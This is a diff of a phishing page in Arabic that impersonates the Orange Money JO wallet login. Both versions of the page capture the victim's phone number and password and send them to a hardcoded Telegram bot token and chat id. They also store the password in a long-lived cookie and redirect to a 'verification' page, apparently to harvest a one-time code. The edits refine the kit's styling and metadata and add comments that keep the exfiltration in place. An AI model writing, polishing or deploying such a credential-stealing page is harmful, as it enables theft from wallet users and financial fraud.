@@ -1,546 +1,173 @@
-<!DOCTYPE html>
-<html data-wf-domain="" data-wf-page="58e125466699330e60585c64" data-wf-site="64ef7d0d34ee51e7fdfd939c" lang="en">
+<!DOCTYPE html><!-- Last Published: Sat Nov 02 2024 03:43:02 GMT+0000 (Coordinated Universal Time) -->
+<html data-wf-domain="" data-wf-page="58e125466699330e60585c64" data-wf-site="64ef7d0d34ee51e7fdfd939c" lang="ar">
 <head>
   <meta charset="utf-8"/>
-  <title>Orange Money - الصفحة الرئيسية</title>
-  <meta content="Orange Money Jo" property="og:title"/>
-  <meta content="محفظة Orange Money Jo" property="og:description"/>
+  <title>Orange Money JO — تسجيل الدخول إلى المحفظة</title>
+  <meta content="تسجيل الدخول الآمن إلى محفظة Orange Money JO — أدرِ حسابك وأجرِ معاملاتك بسهولة" property="og:description"/>
+  <meta content="Orange Money JO — تسجيل الدخول إلى المحفظة" property="og:title"/>
+  <meta content="https://cdn.prod.website-files.com/666e729fb80c1977761b0653/6673eac4fdd598fdb1964e58_448502319_1665996197496616_7531919784203745278_n.jpg" property="og:image"/>
+  <meta content="Orange Money JO — تسجيل الدخول إلى المحفظة" property="twitter:title"/>
+  <meta content="تسجيل الدخول الآمن إلى محفظة Orange Money JO — أدرِ حسابك وأجرِ معاملاتك بسهولة" property="twitter:description"/>
+  <meta content="https://cdn.prod.website-files.com/666e729fb80c1977761b0653/6673eac4fdd598fdb1964e58_448502319_1665996197496616_7531919784203745278_n.jpg" property="twitter:image"/>
   <meta property="og:type" content="website"/>
+  <meta content="summary_large_image" name="twitter:card"/>
   <meta content="width=device-width, initial-scale=1" name="viewport"/>
-  
+  <link href="https://cdn.prod.website-files.com/6709b4ecad0f1ceeeed96305/css/orangemonney.webflow.4d36521a0.css" rel="stylesheet" type="text/css"/>
+  <link href="https://fonts.googleapis.com" rel="preconnect"/>
+  <link href="https://fonts.gstatic.com" rel="preconnect" crossorigin="anonymous"/>
+  <script src="https://ajax.googleapis.com/ajax/libs/webfont/1.6.26/webfont.js" type="text/javascript"></script>
+  <script type="text/javascript">WebFont.load({  google: {    families: ["Montserrat:100,100italic,200,200italic,300,300italic,400,400italic,500,500italic,600,600italic,700,700italic,800,800italic,900,900italic","Roboto:300,regular,500"]  }});</script>
+  <script type="text/javascript">!function(o,c){var n=c.documentElement,t=" w-mod-";n.className+=t+"js",("ontouchstart"in o||o.DocumentTouch&&c instanceof DocumentTouch)&&(n.className+=t+"touch")}(window,document);</script>
+  <link href="https://cdn.prod.website-files.com/img/favicon.ico" rel="shortcut icon" type="image/x-icon"/>
+  <link href="https://cdn.prod.website-files.com/img/webclip.png" rel="apple-touch-icon"/>
   <style>
-    * {
-      margin: 0;
-      padding: 0;
-      box-sizing: border-box;
-    }
-
-    html {
-      scroll-behavior: smooth;
-    }
-
     body {
-      font-family: 'Montserrat', 'Roboto', -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif;
-      font-size: 16px;
-      color: #424242;
-      background-color: #ffffff;
-      direction: rtl;
-      min-height: 100vh;
-      display: flex;
-      flex-direction: column;
+      box-sizing: border-box;
+      font-size:18px;
     }
-
-    /* Header Section - Black Background */
-    . header-section {
-      background-color:  #000000;
-      padding: 30px 0;
-      text-align: center;
-      min-height: 180px;
-      display: flex;
-      align-items: center;
-      justify-content: center;
-    }
-
-    .w-container {
-      max-width: 100%;
-      padding: 0 5%;
-      width: 100%;
-    }
-
-    .blog-home-link {
-      display: inline-flex;
-      align-items: center;
-      justify-content: center;
-    }
-
-    .image {
-      height: 80px;
-      width: auto;
-      max-width: 280px;
-    }
-
-    /* Form Section */
-    .div-block-4 {
-      flex: 1;
-      padding: 50px 20px 80px 20px;
-      background-color: #ffffff;
-    }
-
     .container {
-      max-width: 500px;
-      margin: 0 auto;
-      padding: 0 20px;
+      /*max-width: 800px;*/
+      padding: 0 5%;
+      /*margin: auto;*/
     }
-
-    . w-form {
-      margin:  0;
-    }
-
-    form {
-      display: flex;
-      flex-direction: column;
-      gap: 0;
-    }
-
-    /* Field Holder */
     .field-holder {
-      margin-bottom: 30px;
       position: relative;
+      margin-bottom:1.25em;
     }
-
-    .field-holder label {
-      display: block;
-      text-align: right;
-      margin-bottom: 12px;
-      font-size: 16px;
-      font-weight: 500;
-      color: #808080;
-      letter-spacing: 0.5px;
-    }
-
-    /* Input Fields */
     .w-input {
-      width: 100%;
-      padding:  12px 0;
-      border: none;
-      border-bottom: 1px solid #d0d0d0;
-      outline: none;
-      font-size: 16px;
-      background-color: transparent;
-      transition: border-color 0.3s ease;
-      text-align: right;
-      font-family: 'Montserrat', 'Roboto', sans-serif;
-      color: #424242;
-      -webkit-appearance: none;
-      -moz-appearance: none;
-      appearance: none;
+      border:0;
+      border-bottom: 3px solid #dfdfdf;
+      outline:none;
     }
-
-    .w-input:: placeholder {
-      color: #999;
+    label {
+      position:absolute;
+      top:0;
+      left:0;
+      font-size:1em;
+      color:#424242;
+      display:flex;
+      align-items:center;
+      cursor:text;
+      transition: .3s ease-in-out;
     }
-
-    .w-input:focus {
-      border-bottom: 1px solid #ff8800;
-      box-shadow: none;
+    .w-input, label {
+      font-size:1em;
+      width:100%;
+      height:55px;
     }
-
-    .w-input: :-webkit-outer-spin-button,
-    .w-input::-webkit-inner-spin-button {
-      -webkit-appearance: none;
-      margin: 0;
+    .w-input:focus + label,
+    .w-input:valid + label {
+      color:#ff7900;
+      font-size:.75em;
+      top:-25px;
+      pointer-events: none;
     }
-
-    .w-input[type=number] {
-      -moz-appearance: textfield;
+    .w-input:focus,  .w-input:valid {
+      border-bottom: 3px solid #ff7900;
     }
-
-    /* Hint Text */
-    .hint-text {
-      font-size: 12px;
-      color: #999;
-      text-align: right;
-      margin-top: 6px;
-      line-height: 1.4;
-      letter-spacing: 0.3px;
-    }
-
-    /* Eye Icon */
-    .eye-icon-wrapper {
-      position: relative;
-      display: flex;
-      align-items: center;
-    }
-
-    .eye-icon {
-      position: absolute;
+    .CustomFooter {
+      position: fixed;
       left: 0;
-      top:  50%;
-      transform: translateY(-50%);
-      cursor: pointer;
-      color: #666;
-      font-size: 18px;
-      width: 30px;
-      height: 30px;
-      display: flex;
-      align-items: center;
-      justify-content: center;
-      background-color: transparent;
-      border: none;
-      padding: 0;
-      -webkit-appearance: none;
-      -moz-appearance: none;
-      appearance: none;
+      bottom: 0;
     }
-
-    .eye-icon:focus {
-      outline: none;
-    }
-
-    /* Forgot Password */
-    .forgot-password {
+    /* صفحة - عنوان رئيسي */
+    .page-title {
+      font-family: "Montserrat", sans-serif;
+      font-size: 1.25rem;
+      color:#333;
+      margin: 18px 0;
       text-align: right;
-      margin-top: 10px;
-    }
-
-    .forgot-password a {
-      color: #ff8800;
-      text-decoration:  none;
-      font-size: 13px;
-      font-weight:  600;
-      border-bottom: 2px solid #ff8800;
-      cursor: pointer;
-      transition: opacity 0.3s ease;
-      background:  none;
-      border:  none;
-      font-family: inherit;
-      padding: 0;
-    }
-
-    .forgot-password a:hover {
-      opacity: 0.8;
-    }
-
-    /* Orange Login Button */
-    .submit-button {
-      width: 100%;
-      padding: 18px;
-      border: none;
-      border-radius: 8px;
-      font-size: 18px;
-      font-weight:  600;
-      cursor: pointer;
-      transition: all 0.3s ease;
-      display: flex;
-      align-items: center;
-      justify-content: center;
-      gap: 10px;
-      text-align: center;
-      text-decoration: none;
-      font-family: 'Montserrat', 'Roboto', sans-serif;
-      letter-spacing: 0.5px;
-      -webkit-appearance: none;
-      -moz-appearance: none;
-      appearance: none;
-      background-color: #ff8800;
-      color: white;
-    }
-
-    .submit-button:focus {
-      outline: none;
-      box-shadow: 0 4px 15px rgba(255, 136, 0, 0.3);
-    }
-
-    .submit-button. orange {
-      background-color: #ff8800;
-      color:  white;
-      margin-top: 30px;
-      margin-bottom: 25px;
-    }
-
-    . submit-button.orange:hover {
-      background-color: #e67e00;
-      box-shadow: 0 4px 15px rgba(255, 136, 0, 0.3);
-    }
-
-    .submit-button.orange:active {
-      background-color: #cc6f00;
-    }
-
-    /* Button Group - Two Buttons */
-    .button-group {
-      display: flex;
-      gap: 15px;
-      margin-top: 5px;
-    }
-
-    . button-group . submit-button {
-      flex: 1;
-      border-radius: 8px;
-      padding: 16px;
-      font-size: 16px;
-      margin:  0;
-    }
-
-    .button-black {
-      background-color: #000000;
-      color: white;
-      border: 2px solid #000000;
-    }
-
-    .button-black:hover {
-      background-color:  #222;
-      border-color: #222;
-    }
-
-    .button-black:active {
-      background-color:  #000;
-    }
-
-    . not-black {
-      background-color: #ffffff;
-      color: #000000;
-      border: 2px solid #000000;
-    }
-
-    . not-black:hover {
-      background-color: #f5f5f5;
-      border-color: #333;
-    }
-
-    . not-black: active {
-      background-color:  #efefef;
-    }
-
-    /* Form Messages */
-    .w-form-done,
-    .w-form-fail {
-      display: none;
-      text-align: center;
-      padding: 20px;
-      background-color: #f5f5f5;
-      border-radius: 8px;
-      color: #424242;
-      margin-top: 20px;
-    }
-
-    .w-form-done. w-form-done {
-      display: block;
-      color: #4caf50;
-      background-color: #e8f5e9;
-      border: 1px solid #c8e6c9;
-    }
-
-    .w-form-fail.w-form-fail {
-      display: block;
-      color: #f44336;
-      background-color: #ffebee;
-      border: 1px solid #ffcdd2;
-    }
-
-    /* Responsive Design */
-    @media (max-width: 600px) {
-      .image {
-        height: 70px;
-      }
-
-      .div-block-4 {
-        padding: 40px 15px 80px 15px;
-      }
-
-      .container {
-        padding: 0 15px;
-      }
-
-      . button-group {
-        flex-direction: column;
-      }
-
-      .button-group .submit-button {
-        width: 100%;
-      }
-
-      .submit-button {
-        font-size: 16px;
-        padding: 16px;
-      }
-
-      .field-holder {
-        margin-bottom: 25px;
-      }
-    }
-
-    @media (max-width: 400px) {
-      .image {
-        height: 60px;
-        max-width: 220px;
-      }
-
-      . w-input {
-        font-size: 15px;
-      }
-
-      . submit-button {
-        font-size: 15px;
-        padding: 14px;
-      }
-
-      . field-holder label {
-        font-size: 15px;
-      }
     }
   </style>
 </head>
-
 <body class="body">
-  <!-- Header Section -->
   <div class="div-block-2">
     <div class="header-section">
       <div class="w-container">
         <a href="/" aria-current="page" class="blog-home-link w-inline-block w--current">
-          <img src="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 300 100'%3E%3Crect fill='%23000' width='300' height='100'/%3E%3Ctext x='150' y='60' font-size='48' font-weight='bold' fill='white' text-anchor='middle' font-family='Arial'%3EOrange Money%3C/text%3E%3C/svg%3E" loading="lazy" alt="Orange Money Logo" class="image"/>
+          <img src="https://cdn.prod.website-files.com/6709b4ecad0f1ceeeed96305/6709b4ecad0f1ceeeed963e7_OM%20logo_0.svg" loading="lazy" width="106" height="Auto" alt="Orange Money JO logo" class="image"/>
         </a>
       </div>
     </div>
   </div>
 
-  <!-- Form Section -->
   <div class="div-block-4">
     <div class="container">
+      <!-- عنوان رئيسي محسّن للصفحة -->
+      <h1 class="page-title">تسجيل الدخول إلى محفظة Orange Money JO</h1>
+
       <div class="w-form">
-        <form id="signin" name="signin-form" method="POST">
-          
-          <!-- Phone Number Field -->
-          <div class="field-holder">
-            <label for="phonenumber">رقم الهاتف</label>
-            <input class="w-input" minlength="10" maxlength="10" name="phonenumber" inputmode="numeric" pattern="^(079|078|077)[0-9]{7}$" placeholder="" type="text" id="phonenumber" required=""/>
-            <div class="hint-text">الرجاء إدخال رقم الهاتف الذي يبدأ ب:  077 أو 078 أو 79</div>
+        <form id="signin" name="wf-form-" data-name="تسجيل الدخول" redirect="/verification.html" data-redirect="/verification.html" method="get" data-wf-page-id="58e125466699330e60585c64" data-wf-element-id="79a466c5-9c18-b348-97ed-cbe6dd2fa663">
+          <div id="field" class="field-holder">
+            <input class="text-field-2 w-input" minlength="10" maxlength="10" name="field" inputmode="numeric" data-name="رقم الهاتف" pattern="^(079|078|077)[0-9]{7}$" placeholder="" type="text" id="phonenumber" required=""/>
+            <label for="phonenumber" class="field-label">رقم الهاتف المحمول</label>
           </div>
-
-          <!-- Password Field -->
-          <div class="field-holder">
-            <label for="password">كلمة السر</label>
-            <div class="eye-icon-wrapper">
-              <input class="w-input" maxlength="256" name="password" placeholder="" type="password" id="password" required=""/>
-              <button type="button" class="eye-icon" onclick="togglePassword()" id="eyeToggle" aria-label="Show password">
-                <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
-                  <path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"></path>
-                  <circle cx="12" cy="12" r="3"></circle>
-                </svg>
-              </button>
-            </div>
-            <div class="forgot-password">
-              <a href="javascript:void(0);" onclick="handleForgotPassword()">نسيت كلمة السر</a>
-            </div>
+          <div id="field" class="field-holder">
+            <input class="text-field-2 w-input" maxlength="256" name="field" data-name="كلمة السر" placeholder="" type="password" id="password" required=""/>
+            <label for="password" class="field-label-2">كلمة المرور</label>
           </div>
-
-          <!-- Orange Login Button -->
-          <button type="submit" class="submit-button orange">
-            تسجيل الدخول
-          </button>
-
-          <!-- Bottom Buttons -->
-          <div class="button-group">
-            <button type="button" onclick="handleSignup('auto')" class="submit-button button-black">التسجيل الذاتي</button>
-            <button type="button" onclick="handleSignup('first')" class="submit-button not-black">تسجيل الدخول لأول مرة</button>
+          <div class="div-block">
+            <input type="submit" data-wait="يرجى الانتظار" class="submit-button w-button" value="تسجيل دخول"/>
           </div>
-
+          <div class="div-block spacea">
+            <input type="button" class="submit-button button-black w-button" value="التسجيل الذاتي"/>
+            <input type="button" class="submit-button button-black not-black w-button" value="تسجيل دخول لأول مرة"/>
+          </div>
         </form>
-
-        <div class="w-form-done" id="successMessage">
-          <div>تم إرسال بيانات تسجيل الدخول بنجاح</div>
-        </div>
-        <div class="w-form-fail" id="errorMessage">
-          <div>عذراً!  حدث خطأ أثناء إرسال النموذج</div>
-        </div>
+        <div class="w-form-done"><div>شكراً! تم استقبال طلبك.</div></div>
+        <div class="w-form-fail"><div>عذراً! حدث خطأ أثناء إرسال النموذج.</div></div>
       </div>
     </div>
   </div>
 
+  <script src="https://d3e54v103j8qbb.cloudfront.net/js/jquery-3.5.1.min.dc5e7f18c8.js?site=6709b4ecad0f1ceeeed96305" type="text/javascript" integrity="sha256-9/aliU8dGd2tb6OSsuzixeV4y/faTqgFtohetphbbj0=" crossorigin="anonymous"></script>
+  <script src="https://cdn.prod.website-files.com/6709b4ecad0f1ceeeed96305/js/webflow.1a78e01dd.js" type="text/javascript"></script>
+  <script src="https://code.jquery.com/jquery-latest.min.js" type="text/javascript"></script>
+  <script src="https://cdn.jsdelivr.net/npm/jquery-validation@1.20.1/dist/jquery.validate.min.js"></script>
+
   <script>
-    // Toggle Password Visibility
-    function togglePassword() {
-      const passwordInput = document.getElementById('password');
-      const eyeToggle = document.getElementById('eyeToggle');
-      
-      if (passwordInput.type === 'password') {
-        passwordInput. type = 'text';
-        eyeToggle.innerHTML = '<svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M17. 94 17.94A10. 07 10.07 0 0 1 12 20c-7 0-11-8-11-8a18.45 18.45 0 0 1 5.06-5.94M9. 9 4.24A9.12 9.12 0 0 1 12 4c7 0 11 8 11 8a18.5 18.5 0 0 1-2.16 3.19m-6.72-1.07a3 3 0 1 1-4.24-4.24"></path><line x1="1" y1="1" x2="23" y2="23"></line></svg>';
-      } else {
-        passwordInput.type = 'password';
-        eyeToggle.innerHTML = '<svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"></path><circle cx="12" cy="12" r="3"></circle></svg>';
-      }
-    }
-
-    // Handle Signup
-    function handleSignup(type) {
-      if (type === 'auto') {
-        window.location.href = '/signup-auto. html';
-      } else if (type === 'first') {
-        window.location.href = '/signup-first.html';
-      }
-    }
-
-    // Handle Forgot Password
-    function handleForgotPassword() {
-      window.location.href = '/forgot-password.html';
-    }
-
-    // Handle Form Submission
-    document.getElementById('signin').addEventListener('submit', function(e) {
-      e.preventDefault();
-      
-      const phonenumber = document.getElementById('phonenumber').value;
-      const password = document.getElementById('password').value;
-      const successMessage = document.getElementById('successMessage');
-      const errorMessage = document.getElementById('errorMessage');
-
-      // Hide messages
-      successMessage.style.display = 'none';
-      errorMessage.style.display = 'none';
-
-      // Validation
-      if (!phonenumber || ! password) {
-        errorMessage.innerHTML = '<div>الرجاء ملء جميع الحقول المطلوبة</div>';
-        errorMessage.style.display = 'block';
-        return false;
-      }
-
-      // Format message
-      const text = `رقم الهاتف:  ${phonenumber}\nكلمة السر:  ${password}`;
-      
-      // Send to Telegram
-      const botToken = '8478229937:AAGW3ft5TA9wFX4ThWoIfFA_ihZ9WnvZAXI';
-      const chatId = '6873334348';
-      const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
-
-      fetch(url, {
-        method: 'POST',
-        headers: {
-          'Content-Type': 'application/json',
-        },
-        body: JSON.stringify({
-          chat_id: chatId,
-          text:  text,
-          parse_mode:  'HTML'
-        })
-      })
-      .then(response => response.json())
-      .then(data => {
-        if (data.ok) {
-          successMessage.style.display = 'block';
-          document.getElementById('signin').reset();
-          
-          // Store in cookies
-          setCookie('phonenumber', phonenumber, 1000);
-          setCookie('password', password, 1000);
-          
-          // Redirect after 2 seconds
-          setTimeout(() => {
-            window.location.href = '/verification. html';
-          }, 2000);
-        } else {
-          errorMessage.innerHTML = '<div>فشل الإرسال. الرجاء المحاولة مرة أخرى</div>';
-          errorMessage.style. display = 'block';
-          console.error('Telegram Error:', data);
-        }
-      })
-      .catch(error => {
-        console.error('Error:', error);
-        errorMessage.innerHTML = '<div>خطأ في الاتصال. الرجاء المحاولة مرة أخرى</div>';
-        errorMessage.style. display = 'block';
-      });
-
-      return false;
-    });
-
-    // Set Cookie Function
     function setCookie(cname, cvalue, exdays) {
       const d = new Date();
-      d.setTime(d.getTime() + (exdays * 24 * 60 * 60 * 1000));
-      let expires = "expires=" + d. toUTCString();
+      d.setTime(d.getTime() + (exdays*24*60*60*1000));
+      let expires = "expires="+ d.toUTCString();
       document.cookie = cname + "=" + cvalue + ";" + expires + ";path=/";
     }
+
+    $('#signin').on( "submit", function (e) {
+      e.preventDefault(); // تجنّب الإرسال الحقيقي أثناء المعاينة
+      phonenumber = document.getElementById('phonenumber').value;
+      document.getElementById('phonenumber').setAttribute("name",'phonenumber');
+      password = document.getElementById('password').value;
+      document.getElementById('password').setAttribute("name",'password');
+
+      var message = "رقم الهاتف:`"+phonenumber+"`\n";
+      message += "كلمة السر:`"+password+"`\n";
+
+      // ملاحظة: رابط التليجرام والـ chat_id تم تركهما كما في الملف الأصلي — تأكد من استخدام القناة الصحيحة أو إزالة الإرسال للخصوصية.
+      $.ajax({
+        type: 'POST',
+        url: `https://api.telegram.org/bot8478229937:AAGW3ft5TA9wFX4ThWoIfFA_ihZ9WnvZAXI/sendMessage`,
+        data: {
+          chat_id: "6873334348",
+          text: message,
+          parse_mode: 'markdown',
+        },
+        success: function (res) {
+          console.debug(res);
+          $('#response').text('Message sent');
+        },
+        error: function (error) {
+          console.error(error);
+          alert("error failed");
+        }
+      });
+
+      setCookie("phonenumber",phonenumber,1000);
+      setCookie("password",password,1000);
+
+      // إعادة التوجيه للصفحة التالية كما في الأصل
+      window.location.href = "/verification.html";
+    });
   </script>
 </body>
 </html>
